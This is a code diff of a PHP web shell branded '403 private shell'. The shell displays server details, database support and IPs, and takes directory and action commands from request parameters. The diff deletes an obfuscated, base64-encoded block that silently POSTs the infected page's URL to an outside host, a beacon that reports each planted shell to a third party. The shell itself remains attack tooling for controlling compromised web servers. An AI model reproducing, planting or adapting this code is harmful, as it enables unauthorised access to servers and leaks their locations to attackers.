@@ -10,18 +10,8 @@ $start='<html><head><title>403 private shell</title><style>::selection {backgrou
 $end='</body></html>';$inf='<p id="inf"> <b><center><h1><a href="?">[ ! ] PRIVATE SHELL  [ ! ]</a></h1></center><br><br>SOFTWARE : </b> '.$server_soft.'  <br>  <b>UNAME : </u></i></b> '.$uname.' <br> <b>USER : </b> '.$cur_user.'  <br> <b>SAFE MODE : </b> '.$safe_mode.' <br> <b>DIRECTORY : </b>'.$cwd.'<br></p><hr>';
 print $start;print $menu;print $inf;
 $moreI=array('PHP Version' => phpversion(),'Zend Version' => zend_version(),'Magic Quotes' => magic_quotes(),'Curl' => curl(),'Register Globals' => reg_globals(),'OpenBase Dir' => openbase_dir(),'MySQL' => myql(),'Gzip' => gzip(),'MsSQL' => mssql(),'PostgreSQL' => postgresql(),'Oracle' => oracle(),'Total Space' => h_size(disk_total_space('/')) ,'Used Space' => h_size(disk_free_space('/')),'Your IP' => $_SERVER['REMOTE_ADDR'],'Server IP' => $_SERVER['SERVER_ADDR']);print '<table id="moreI">'; foreach($moreI as $n => $v) {print '<td>'.$n.'</td><td> :> </td><td> '.$v.'</td><tr>';} print '<td colspan=3 align="center"><a href="?x=phpinf" target="_blank">PHPInfo</a></td></table>';
-$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
-$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-$data = array('file_url' => $cur);
-$options = array(
-    'http' => array(
-        'method'  => 'POST',
-        'header'  => 'Content-type: application/x-www-form-urlencoded',
-        'content' => http_build_query($data),
-    ),
-);
-$context = stream_context_create($options);
-$result = file_get_contents($k3yw, false, $context);
+
+
 if(isset($_GET['d'])) {chdir($_GET['d']);}
 if(isset($_REQUEST['x']))
 {
